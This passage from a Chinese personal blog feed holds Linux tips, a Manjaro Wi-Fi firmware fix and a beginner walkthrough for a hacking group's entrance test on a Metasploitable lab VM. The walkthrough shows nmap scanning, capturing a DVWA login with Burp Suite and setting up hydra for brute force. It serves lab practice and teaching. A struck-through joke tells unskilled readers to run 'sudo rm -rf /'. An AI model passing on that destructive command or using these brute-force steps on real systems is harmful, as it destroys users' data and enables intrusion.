<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~ [1]&gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py &amp;&amp; cd /tmp &amp;&amp; python test.py
</span></span><span class="line"><span class="cl">The authenticity of host &#39;[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)&#39; can&#39;t be established.
</span></span><span class="line"><span class="cl">ECDSA key fingerprint is SHA256:8J1Z+I8NtPXAk7EFDwLiwu8pmwSoPLYeJM2iYnV7z5M.
</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820&#39; (ECDSA) to the list of known hosts.
</span></span><span class="line"><span class="cl">root@cn-zj-dx-2.sakurafrp.com&#39;s password: 
</span></span><span class="line"><span class="cl">test.py                                                      100%   21     0.2KB/s   00:00    
</span></span><span class="line"><span class="cl">Hello World
</span></span></code></pre></td></tr></table>
</div>
</div><p>上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦</p>
<p>写完啦！</p>
<h2 id="参考链接">参考链接</h2>
<p>啥？这次没有，自己试出来的&hellip;</p>
<p>唔啊！准确来说也有，那就是各种搜索引擎啦～</p>
]]></description>
</item><item>
    <title>如何解决 Manjaro 中 QCA6174 网卡问题</title>
    <link>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</link>
    <pubDate>Fri, 17 Jul 2020 10:30:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/photo_2020-07-16_23-54-59.jpg" referrerpolicy="no-referrer">
            </div><h2 id="开场白">开场白</h2>
<p>尝试在 Redmibook 14 中安装了 Manjaro, 装完发现 WIFI 不能用</p>
<p>此时陷入了疑惑, 难道 Manjaro 也不自带 linux-firmware ?</p>
<p>总之经过了一系列折腾, 最后还是解决了, 写篇东西来记录一下解决的过程</p>
<h2 id="尝试使用其他方法连接网络">尝试使用其他方法连接网络</h2>
<p>既然 WIFI 不能用, 那也要想别的办法联网, 不然这问题就很棘手了</p>
<p>我能想到的是插网线, 可这是轻薄本, 没有有限网卡, 那么我们还有一种办法, 使用手机的 USB 网络共享</p>
<p>这个过程很简单, 按照以下步骤走</p>
<ol>
<li>
<p><strong>使用 USB 数据线将电脑与手机连接, 并打开 USB 网络共享</strong></p>
<ul>
<li><del>这个都不会的, 可以执行 <code>sudo rm -rf /</code></del></li>
<li><del>这智商, 玩你妈的 Linux</del></li>
<li>不会的, 请<a href="https://jingyan.baidu.com/article/09ea3ede1cfbf1c0aede391d.html" target="_blank" rel="noopener noreffer">参考这里</a></li>
</ul>
</li>
<li>
<p><strong>打开终端, 执行</strong></p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo ip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后它会返回这样的东西, 如图</p>
<p></p>
<p>设置网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo ip link set enp3s0f4u2 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行 <code>dhcpcd</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来, 我试着运行 <code>ifconfig</code>, 可是不能用, 但是看了一眼 <code>network manager</code></p>
<p>嗯 能上网了</p>
<p></p>
<h2 id="解决过程">解决过程</h2>
<h3 id="软件源">软件源</h3>
<p>我们会进行软件包的装卸, 所以我们首先需要做的是选择合适的软件源&hellip;.</p>
<p>ok, 现在我们需要修改的文件是这个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们用 <code>nano</code> 改, 记得加 <code>sudo</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo nano /etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>将 <code># China</code> 下面的内容 放到第一行</p>
<p>至于 <code>nano</code> 的用法, 请自行查找资料, 会用记事本就会用这个</p>
<p>修改完后, 如图</p>
<p></p>
<p>然后执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -Sy
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装-linux-firmware">安装 <code>linux-firmware</code></h3>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S linux-firmware
</span></span></code></pre></td></tr></table>
</div>
</div><p>重启之后, 发现还是无效, 此时我去谷歌查了一下.</p>
<p>发现, 我们需要手动从 <a href="https://github.com/FireWalkerX/ath10k-firmware/tree/master/QCA6174/hw3.0" target="_blank" rel="noopener noreffer">Github</a> 下载它的驱动文件</p>
<h3 id="手动替换驱动文件">手动替换驱动文件</h3>
<p>到上面那个链接指向的 Github 仓库, 下载 <code>board-2.bin</code> 和 <code>firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1</code>, 分别将它们重命名为: <code>board.bin</code> 和 <code>firmware-4.bin</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后把这两个文件复制到 <code>/lib/firmware/ath10k/QCA6174/hw3.0/</code> 目录下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后重启系统, WIFI 就能用了.</p>
<p></p>
<h2 id="总结">总结</h2>
<p>以上内容均为 Redmibook 14 的解决过程, 并不一定适用于其他设备, 因此仅供参考.</p>
]]></description>
</item><item>
    <title>锏幕 新人测试教程</title>
    <link>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</link>
    <pubDate>Sun, 20 Oct 2019 23:44:37 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-6ql7el.jpg" referrerpolicy="no-referrer">
            </div><p><strong>注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！</strong></p>
<h2 id="开场白">开场白</h2>
<p>诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人测试，特意为此写篇博客做个教程。</p>
<p>好让你们看完过一下，那么…</p>
<p>嘛.. 我们开始吧..</p>
<h2 id="考核内容">考核内容</h2>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">名称</td>
<td style="text-align:left">锏幕四项萌新考核</td>
<td style="text-align:left">考核的名称</td>
</tr>
<tr>
<td style="text-align:center">难度</td>
<td style="text-align:left">Low</td>
<td style="text-align:left">难度系数</td>
</tr>
<tr>
<td style="text-align:center">第一关</td>
<td style="text-align:left">简单破解Web表单</td>
<td style="text-align:left">必须通过，否则无法进行下一关</td>
</tr>
<tr>
<td style="text-align:center">第二关</td>
<td style="text-align:left">简单SQL注入</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第三关</td>
<td style="text-align:left">操作系统渗透</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第四关</td>
<td style="text-align:left">获取root权限</td>
<td style="text-align:left">必须通过</td>
</tr>
</tbody>
</table>
<p><strong>PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境</strong></p>
<h2 id="环境准备">环境准备</h2>
<p>上面已经说明了需要用到<strong>metasploitable</strong>，那么接下来我会写出如何配置靶机环境</p>
<h3 id="第一步下载解压">第一步|下载&amp;解压</h3>
<p>首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。</p>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">点击这里可以下载</a></p>
<p>点进去以后点击那个巨大的<strong>Download</strong>即可下载。</p>
<p>嘛..我已经下载好了，是个<strong>zip</strong>文件。</p>
<p>然后你需要解压，两种方法:</p>
<ul>
<li>Linux
<ul>
<li>unzip命令</li>
<li>file-roller(GUI)</li>
</ul>
</li>
<li>Windows
<ul>
<li>各种解压软件</li>
</ul>
</li>
</ul>
<p>这个不用多说吧..</p>
<p><strong>解压个东西都不会还想加入锏幕?</strong></p>
<p></p>
<p>解压完了就可以进行下一步了。</p>
<h3 id="第二步创建虚拟机">第二步|创建虚拟机</h3>
<p>你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法</p>
<p>首先，打开你的VirtualBox</p>
<p></p>
<p>然后点击上面的新建…(这个还要教吗?)</p>
<p></p>
<p>然后选择的虚拟机类型和操作系统版本，<strong>这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！</strong>
</p>
<p></p>
<p>然后这里就<strong>不用创建虚拟硬盘</strong>了，我们选择<strong>使用现有的虚拟硬盘文件</strong>。</p>
<p></p>
<p>点击这个东西，</p>
<p></p>
<p>然后点击<strong>注册</strong></p>
<p></p>
<p>找到你的<strong>metasploitable</strong>目录并且找到这个<strong>vmdk文件</strong>，这个就是虚拟硬盘文件。</p>
<p></p>
<p>点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。</p>
<p></p>
<p>接下来就可以创建了</p>
<p></p>
<p><strong>在启动之前要把虚拟机的联网改成桥接</strong></p>
<p><strong>依次点击设置——网络</strong></p>
<p>然后就会跳出这个页面</p>
<p></p>
<p>将它改成桥接网卡即可</p>
<p></p>
<p>最后启动虚拟机，你的靶机环境就搭建完成了。

</p>
<p>开机之后<strong>不要去操作靶机</strong>也<strong>不要去理会它</strong></p>
<p></p>
<h2 id="考核过程">考核过程</h2>
<p>现在环境已经准备完毕了，我们可以开始进行过关了。接下来请<strong>认真看！认真看！认真看！</strong>（重要的事情说三遍）</p>
<h3 id="嗅探扫描">嗅探！扫描！</h3>
<p>我们刚刚搭建完靶机却不知道它的<strong>IP地址</strong>，这意味着我们不知道<strong>它的位置</strong>，那么怎么办呢？这个时候我们要用到<strong>nmap</strong>把他扫出来。</p>
<p>不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是<code>192.168.0.1/24</code></p>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -v -O 192.168.0.1/24
</span></span><span class="line"><span class="cl">!<span class="o">[](</span>/img/截图_2019-10-20_06-27-08.png<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现它很快就扫出来了</p>
<p></p>
<p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.107
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 977 closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp   open  ftp
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">23/tcp   open  telnet
</span></span><span class="line"><span class="cl">25/tcp   open  smtp
</span></span><span class="line"><span class="cl">53/tcp   open  domain
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
</span></span><span class="line"><span class="cl">512/tcp  open  exec
</span></span><span class="line"><span class="cl">513/tcp  open  login
</span></span><span class="line"><span class="cl">514/tcp  open  shell
</span></span><span class="line"><span class="cl">1099/tcp open  rmiregistry
</span></span><span class="line"><span class="cl">1524/tcp open  ingreslock
</span></span><span class="line"><span class="cl">2049/tcp open  nfs
</span></span><span class="line"><span class="cl">2121/tcp open  ccproxy-ftp
</span></span><span class="line"><span class="cl">3306/tcp open  mysql
</span></span><span class="line"><span class="cl">5432/tcp open  postgresql
</span></span><span class="line"><span class="cl">5900/tcp open  vnc
</span></span><span class="line"><span class="cl">6000/tcp open  X11
</span></span><span class="line"><span class="cl">6667/tcp open  irc
</span></span><span class="line"><span class="cl">8009/tcp open  ajp13
</span></span><span class="line"><span class="cl">8180/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.9 - 2.6.33
</span></span><span class="line"><span class="cl">Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=192 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
<h3 id="第一关简单破解web表单">第一关|简单破解Web表单</h3>
<p>接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。</p>
<p></p>
<blockquote>
<p>小白：唔？为什么你的IP不是上面写的107了，变成4了</p>
<p>回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。</p>
</blockquote>
<p>接下来我们点击<strong>DVWA</strong>，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。</p>
<p></p>
<p>QwQ，然后..是不是到这里就一脸懵逼了</p>
<h4 id="抓包">抓包</h4>
<p>嘛，记得<strong>Burpsuite</strong>吗？</p>
<p>就是一个java写的软件</p>
<p></p>
<p>试试？</p>
<p>在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox</p>
<p>那么，在burpsuite里面依次点击</p>
<p><code>Proxy（左上角内个）——Options</code></p>
<p></p>
<p>从这里我们就获得了burp默认的代理地址<code>127.0.0.1:8080</code></p>
<p>接下来要到浏览器里设置它，</p>
<p>简单地给出截图吧</p>
<p></p>
<p></p>
<p>然后点确定，就这样设置好了</p>
<p>嘛…<strong>浏览器都不会用</strong>的也别来锏幕了</p>
<p>然后回到burp，确认一下这个<strong>Intercept</strong>是否为<strong>on</strong>，如果是就进行下一步操作，如果不是就点一下。。。</p>
<p></p>
<p>接下来，回到浏览器</p>
<p></p>
<p>emmmm….我们知道一般网站的默认管理员帐号都是<strong>admin</strong>，这里也不例外，接下来我们试着在Username这个框框里输入<code>admin</code>，<strong>Password</strong>这个框框里随便输入点什么</p>
<p></p>
<p>然后点击<strong>login</strong>。</p>
<p>接下来我们就抓取到了这个数据包了，下面还有我输入过的信息</p>
<p></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/dvwa/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.0.4</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">46</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.0.4/dvwa/login.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛…这么一大堆看着都头晕</p>
<p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
<p>现在网页看起来像时间停止了一样一动不动的对不对？</p>
<p>那么我来解释一下burp这里三个按钮的意思</p>
<ul>
<li>Forward:放行，让网页继续执行抓到的数据包</li>
<li>Drop:丢弃，将这个数据包扔了，网页就执行不了了</li>
</ul>
<p>现在，我们点击<code>Forward</code>，放行这个数据包</p>
<p>这时，网页下面弹出了一段字符串</p>
<p></p>
<p>码下来，一会儿要用到的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
<p>嗯…整个抓包的过程就完成了。然后就是进行<strong>爆破</strong>了</p>
<h4 id="爆破">爆破</h4>
<p>嘛…最精彩的部分来了</p>
<p>你知道<strong>hydra</strong>吗？如果不知道那么请出门左转用搜索引擎查一下。</p>
<p>我们要给hydra设置这么几个参数</p>
<ul>
<li>-l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin</li>
<li>-P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码</li>
<li>-V : 显示详细过程</li>
<li>-n es : 尝试空口令登录</li>
<li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
<li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
